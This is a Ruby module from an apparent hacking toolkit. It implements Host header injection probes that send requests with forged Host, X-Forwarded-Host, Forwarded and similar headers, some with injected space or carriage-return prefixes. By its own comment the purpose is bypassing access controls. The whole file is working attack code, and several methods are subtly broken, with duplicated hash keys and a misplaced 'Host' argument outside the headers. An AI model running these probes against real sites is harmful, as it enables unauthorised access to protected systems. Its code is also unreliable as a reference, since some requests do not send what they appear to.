# frozen_string_literal: true

# Process.spawn("ruby -run -ehttpd . -p8008")
# sleep 10
module Snackhack2
  class HostInjection
    attr_accessor :site, :new_host_ip, :old_host_ip
    # old_host_ip: the IP of the host (public IP) that its supposed to be
    # new_host_ip: the IP of the host to bypass access controls
    def initialize
      @site = site
    end
    def test_all
      p @new_host_ip
      p @old_host_ip
      [ "Host", "\sHost", "\rHost", "X-Forwarded-Host", "\sX-Forwarded-Host",
        "X-Host", "\sX-Host", "\rX-Host", "X-Remote-Addr", "\sX-Remote-Addr",
        "\rX-Remote-Addr", "X-Remote-IP", "\sX-Remote-IP", "\rX-Remote-IP",
        "X-Forwarded-Server", "\sX-Forwarded-Server", "\rX-Forwarded-Server",
        "Forwarded", "\sForwarded", "\rForwarded", "\sX-HTTP-Host-Override",
        "X-HTTP-Host-Override", "\rX-HTTP-Host-Override"].each do |h|
          head = {"Host" => @old_host_ip}
          head[h] = @new_host_ip
          r = HTTParty.get(@site, headers: head)
          puts r.code
          puts "\n==========================\n"
      end
    end

    def host_ip
      unless @old_host_ip.nil?
        response = HTTParty.get(@site, headers: { "Host" => @old_host_ip})
        puts response.body
        puts response.code
      end
    end
    def double_host_ip
      unless @old_host_ip.nil?
        response = HTTParty.get(@site, headers: { "Host" => @old_host_ip, "Host" => @new_host_ip})
        puts response.body
        puts response.code
      end
    end
    def x_forwarded
      unless @old_host_ip.nil?
        response = HTTParty.get(@site, headers: { "Host" => @old_host_ip, "X-Forwarded-Host" => @new_host_ip})
        puts response.body
        puts response.code
      end
    end
    def double_x_forwarded
      unless @old_host_ip.nil?
        response = HTTParty.get(@site, headers: { "X-Forwarded-Host" => @old_host_ip, "X-Forwarded-Host" => @new_host_ip})
        puts response.body
        puts response.code
      end
    end
    def x_forwarded_server
      unless @old_host_ip.nil?
        r = HTTParty.get(@site, headers: {"Host" => @old_host_ip, "X-Forwarded-Server" => @new_host_ip})
        puts r.body
        puts r.code
        r = HTTParty.get(@site, headers: {"X-Forwarded-Server" => @old_host_ip, "X-Forwarded-Server" => @new_host_ip})
        puts r.body
        puts r.code
      end
    end
    def http_host_override
      unless @old_host_ip.nil?
        r = HTTParty.get(@site, headers: {"Host" => @old_host_ip, "X-HTTP-Host-Override" => @new_host_ip})
        puts r.body
        puts r.code
        r = HTTParty.get(@site, headers: {"X-HTTP-Host-Override" => @old_host_ip, "X-HTTP-Host-Override" => @new_host_ip}).body
      end
    end
    def extra_return_host
      unless @new_host_ip.nil?
        response = HTTParty.get(@site, headers: {"\rHost" => "#{@new_host_ip}"}, "Host" => "#{old_host_ip}").body
        puts response
      end
    end
    def extra_space_host
      unless @new_host_ip.nil?
        response = HTTParty.get(@site, headers: {"\sHost" => "#{@new_host_ip}"}, "Host" => "#{old_host_ip}").body
        puts response
      end
    end
  end
end




